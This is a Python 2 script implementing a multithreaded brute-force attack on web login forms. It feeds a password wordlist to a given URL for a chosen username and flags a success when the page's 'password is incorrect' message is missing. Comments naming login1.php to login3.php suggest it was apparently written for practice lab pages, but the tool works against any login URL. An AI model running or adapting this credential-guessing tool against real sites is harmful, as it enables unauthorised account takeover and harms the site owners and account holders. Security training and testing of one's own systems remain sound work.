import urllib2
import urllib
import sys
import os
import re
from optparse import OptionParser
from Queue import Queue
import threading


class pwguesserthread(threading.Thread):

    def __init__(self, url, username, pwqueue):
        threading.Thread.__init__(self)
        self.myqueue = pwqueue
        self.username = username
        self.url = url

    def run(self):
        while not exitthread.isSet():
            password = self.myqueue.get()
            if options.verbose:
                screenmutex.acquire()
                print self.name + " is guessing " + password
                screenmutex.release()
            if password == "!!killallthreads!!":
                break
            postdata = urllib.urlencode(
                {'username': str(self.username), 'password': str(password)})
            request = urllib2.Request(self.url, postdata)
            try:
                webcontent = requestor.open(request).read()
            except (urllib2.URLError, urllib2.HTTPError):
                screenmutex.acquire()
                print "Error Accessing Page"
                screenmutex.release()
                sys.exit(2)

            # login1.php matches=re.findall(r'(?i)password.*?is incorrect.',webcontent)
            #matches=re.findall(r'(?i)password.*?is incorrect.',webcontent)
            #login2.php = matches=re.findall(r"<font color='White'>Success</font>Fail<font color='White'>Success</font>",webcontent)
            #matches=re.findall(r"<font color='White'>Success</font>Fail<font color='White'>Success</font>",webcontent)
            # Here is a regular expression for login3.php
            matches = re.findall(r'(?i)password.*?is incorrect.', webcontent)
            if len(matches) > 0:
                # if there were matches then we failed.  Try the next password.
                continue
            else:
                # if we are here then we didn't match fail.  We may have a
                # successful login.
                screenmutex.acquire()
                print "Password found in thread " + self.name + " Password=" + password
                screenmutex.release()
                exitthread.set()
                break
            pwqueue.taskdone()
        print "Thread Exiting " + self.name

parser = OptionParser(usage='%prog [OPTIONS]')
parser.add_option(
    '-u', '--user', help='A valid username on the site.', dest='user')
parser.add_option('-U', '--url', help='The URL to the site login', dest='url')
parser.add_option(
    '-p', '--passfile', help='A file containing passwords', dest='passfile')
parser.add_option(
    '-v', '--verbose', action='store_true', help='Be verbose', dest='verbose')

(options, args) = parser.parse_args()
if ((options.user == None) or (options.url == None) or (options.passfile == None)):
    parser.print_help()
    sys.exit(2)
if not os.path.exists(options.passfile):
    print "Password file does not exist."
    sys.exit(2)

requestor = urllib2.build_opener()
success = False
passwordfile = open(options.passfile, "r")
pwqueue = Queue()
exitthread = threading.Event()
exitthread.clear()
screenmutex = threading.RLock()


for x in range(5):
    th = pwguesserthread(options.url, options.user, pwqueue)
    print "Starting a new thread"
    th.start()

passwordfile = open(options.passfile, "r")
for password in passwordfile:
    pwqueue.put(password.strip())

pwqueue.put("!!killallthreads!!")
pwqueue.put("!!killallthreads!!")
pwqueue.put("!!killallthreads!!")
pwqueue.put("!!killallthreads!!")
pwqueue.put("!!killallthreads!!")

for x in threading.enumerate():
    if x.name == "MainThread":
        continue
    print "The main thread is waiting on thread " + x.name + " to Exit."
    x.join()
